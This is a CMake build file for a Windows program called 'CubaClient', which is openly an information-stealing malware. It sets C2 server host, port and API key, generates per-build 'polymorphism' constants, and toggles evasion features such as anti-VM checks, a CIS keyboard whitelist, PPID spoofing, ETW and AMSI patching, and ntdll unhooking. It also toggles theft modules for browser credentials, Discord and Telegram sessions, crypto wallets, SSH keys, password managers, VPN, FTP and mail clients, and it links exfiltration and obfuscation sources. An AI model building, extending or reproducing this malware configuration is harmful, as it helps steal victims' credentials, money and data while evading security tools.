cmake_minimum_required(VERSION 3.21)
project(CubaClient LANGUAGES CXX C ASM)

set(CMAKE_CXX_STANDARD 20)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

# ── C2 config - pass via env or -D flags; debug falls back to localhost ────────
set(C2_HOST    "$ENV{C2_HOST}"    CACHE STRING "C2 server hostname")
set(C2_PORT    "$ENV{C2_PORT}"    CACHE STRING "C2 server port")
set(C2_API_KEY "$ENV{C2_API_KEY}" CACHE STRING "C2 API key")
set(ZIP_PASS   "$ENV{ZIP_PASS}"   CACHE STRING "ZIP encryption password")

if(NOT C2_HOST)
    set(C2_HOST "127.0.0.1")
endif()
if(NOT C2_PORT)
    set(C2_PORT 5000)
endif()
if(NOT C2_API_KEY)
    set(C2_API_KEY "")
endif()
if(NOT ZIP_PASS)
    set(ZIP_PASS "debug")
endif()

# ── per-build polymorphism constants - regenerated every cmake configure ──────
string(RANDOM LENGTH 4 ALPHABET "0123456789ABCDEF" _k1_raw)
string(RANDOM LENGTH 4 ALPHABET "0123456789ABCDEF" _k2_raw)
string(RANDOM LENGTH 4 ALPHABET "0123456789ABCDEF" _k3_raw)
string(RANDOM LENGTH 4 ALPHABET "0123456789ABCDEF" _k4_raw)
set(POLY_K1 "0x${_k1_raw}U")
set(POLY_K2 "0x${_k2_raw}U")
set(POLY_K3 "0x${_k3_raw}U")
set(POLY_K4 "0x${_k4_raw}U")
message(STATUS "POLY_K1=${POLY_K1} POLY_K2=${POLY_K2} POLY_K3=${POLY_K3} POLY_K4=${POLY_K4}")

# ── feature toggles ───────────────────────────────────────────────────────────
option(FEATURE_ANTIVM            "Anti-VM check"                  ON)
option(FEATURE_ANTITARG          "CIS keyboard whitelist"         ON)
option(FEATURE_ANALYST_PATH_CHECK "Block analyst execution paths" ON)
option(FEATURE_PPID_SPOOF        "PPID spoofing"                  ON)
option(FEATURE_ETW_PATCH         "ETW patching"                   ON)
option(FEATURE_AMSI_PATCH        "AMSI patching"                  ON)
option(FEATURE_UNHOOK            "ntdll unhooking"                ON)
option(FEATURE_CHROMIUM          "Chromium credential theft"      ON)
option(FEATURE_GECKO             "Gecko credential theft"         ON)
option(FEATURE_DISCORD           "Discord token theft"            ON)
option(FEATURE_TELEGRAM          "Telegram session theft"         ON)
option(FEATURE_WIFI              "WiFi password theft"            ON)
option(FEATURE_SSH               "SSH key theft"                  ON)
option(FEATURE_CLIPBOARD         "Clipboard theft"                ON)
option(FEATURE_NOTEPADPP         "Notepad++ backup theft"         ON)
option(FEATURE_EXTENSIONS        "Browser extension theft"        ON)
option(FEATURE_CRYPTO            "Crypto wallet theft"            ON)
option(FEATURE_FTP               "FTP client theft"               ON)
option(FEATURE_GAMING            "Gaming platform theft"          ON)
option(FEATURE_VPN               "VPN config theft"               ON)
option(FEATURE_COLDWALLET        "Cold wallet seed scanning"      ON)
option(FEATURE_MAIL              "Email client theft"             ON)
option(FEATURE_DEVTOOLS          "Dev tool credential theft"      ON)
option(FEATURE_CREDENTIALS       "Windows CredMan + PuTTY/RDP"   ON)
option(FEATURE_SCREENSHOT        "Screenshot on first run"        ON)
option(FEATURE_PASSWORD_MANAGERS "Password manager grabber"       ON)

# ── minizip-ng ────────────────────────────────────────────────────────────────
set(CMAKE_FIND_LIBRARY_SUFFIXES .a .dll.a)

include(FetchContent)

set(FETCHCONTENT_BASE_DIR "${CMAKE_SOURCE_DIR}/.deps" CACHE PATH "" FORCE)

set(MZ_COMPAT           OFF CACHE BOOL "" FORCE)
set(MZ_BZIP2            OFF CACHE BOOL "" FORCE)
set(MZ_LZMA             OFF CACHE BOOL "" FORCE)
set(MZ_ZSTD             OFF CACHE BOOL "" FORCE)
set(MZ_OPENSSL          OFF CACHE BOOL "" FORCE)
set(MZ_LIBCOMP          OFF CACHE BOOL "" FORCE)
set(MZ_PKCRYPT          ON  CACHE BOOL "" FORCE)
set(MZ_WZAES            ON  CACHE BOOL "" FORCE)
set(MZ_ZLIB             ON  CACHE BOOL "" FORCE)
set(MZ_FETCH_LIBS       ON  CACHE BOOL "" FORCE)
set(BUILD_SHARED_LIBS   OFF CACHE BOOL "" FORCE)
set(ZLIB_ALIASES        OFF CACHE BOOL "" FORCE)
set(SKIP_INSTALL_LIBRARIES ON CACHE BOOL "" FORCE)
set(SKIP_INSTALL_ALL       ON CACHE BOOL "" FORCE)

FetchContent_Declare(minizip-ng
    GIT_REPOSITORY https://github.com/zlib-ng/minizip-ng.git
    GIT_TAG        4.0.7
    GIT_SHALLOW    TRUE
)
FetchContent_MakeAvailable(minizip-ng)

# ── sources ───────────────────────────────────────────────────────────────────
set(SOURCES
    src/main.cpp
    src/imp/sysinfo.cpp
    src/imp/chromium/abe.cpp
    src/imp/chromium/decrypt_db.cpp
    src/imp/chromium/extract_chromium.cpp
    src/imp/gecko/extract_gecko.cpp
    src/util/browser_utils/get_browsers.cpp
    src/util/ccurrency_utils/get_crypto.cpp
    src/util/crypto_utils/crypto_helper.cpp
    src/util/crypto_utils/gecko_crypto.cpp
    src/util/exfiltration_utils/log_collection.cpp
    src/util/exfiltration_utils/zip.cpp
    src/util/misc_stealing/notepadpp.cpp
    src/util/misc_stealing/extensions.cpp
    src/util/misc_stealing/discord.cpp
    src/util/misc_stealing/telegram.cpp
    src/util/misc_stealing/system_misc.cpp
    src/util/misc_stealing/ftp_clients.cpp
    src/util/misc_stealing/gaming.cpp
    src/util/misc_stealing/vpn.cpp
    src/util/misc_stealing/cold_wallets.cpp
    src/util/misc_stealing/mail_clients.cpp
    src/util/misc_stealing/dev_tools.cpp
    src/util/misc_stealing/credentials.cpp
    src/util/misc_stealing/password_managers.cpp
    src/util/exfiltration_utils/mem_store.cpp
    src/util/obfuscation/syscall.cpp
    src/util/obfuscation/syscall_stub.S
    src/util/obfuscation/tls_callback.cpp
    src/util/obfuscation/unhook.cpp
    src/util/obfuscation/ppid_spoof.cpp
    src/util/safety_utils/antitarg.cpp
    src/util/safety_utils/antivm.cpp
    src/util/safety_utils/evasion.cpp
    ext/sqlite_utils/sqlite3.c
)

add_executable(CubaClient ${SOURCES})

target_include_directories(CubaClient PRIVATE
    ${CMAKE_CURRENT_SOURCE_DIR}/ext
    ${CMAKE_CURRENT_SOURCE_DIR}/src/util
    ${CMAKE_CURRENT_SOURCE_DIR}/src/def
)

target_compile_definitions(CubaClient PRIVATE
    _CRT_SECURE_NO_WARNINGS
    UNICODE
    _UNICODE
    $<$<CONFIG:Debug>:_DEBUG>
    $<$<CONFIG:Release>:NDEBUG>
    C2_HOST="${C2_HOST}"
    C2_PORT_NUM=${C2_PORT}
    C2_API_KEY_STR="${C2_API_KEY}"
    ZIP_PASS_STR="${ZIP_PASS}"
    POLY_K1=${POLY_K1}
    POLY_K2=${POLY_K2}
    POLY_K3=${POLY_K3}
    POLY_K4=${POLY_K4}
)

foreach(F ANTIVM ANTITARG ANALYST_PATH_CHECK PPID_SPOOF ETW_PATCH AMSI_PATCH UNHOOK
          CHROMIUM GECKO DISCORD TELEGRAM WIFI SSH CLIPBOARD
          NOTEPADPP EXTENSIONS CRYPTO
          FTP GAMING VPN COLDWALLET MAIL DEVTOOLS CREDENTIALS SCREENSHOT
          PASSWORD_MANAGERS)
    if(FEATURE_${F})
        target_compile_definitions(CubaClient PRIVATE FEATURE_${F})
    endif()
endforeach()

target_compile_options(CubaClient PRIVATE
    $<$<CONFIG:Debug>:   -O0 -g>
    $<$<CONFIG:Release>: -O3 -fno-rtti -ffunction-sections -fdata-sections -fvisibility=hidden>
)

# winhttp/bcrypt/crypt32/wtsapi32 loaded at runtime via iat_proxy - removed from static link
# ole32/oleaut32 unused - no COM in this codebase
target_link_libraries(CubaClient PRIVATE
    minizip-ng
    advapi32
)

target_link_options(CubaClient PRIVATE
    -static -static-libgcc -static-libstdc++
    $<$<CONFIG:Debug>:   -mconsole>
    $<$<CONFIG:Release>: -mwindows -s
                         -Wl,--gc-sections>
)
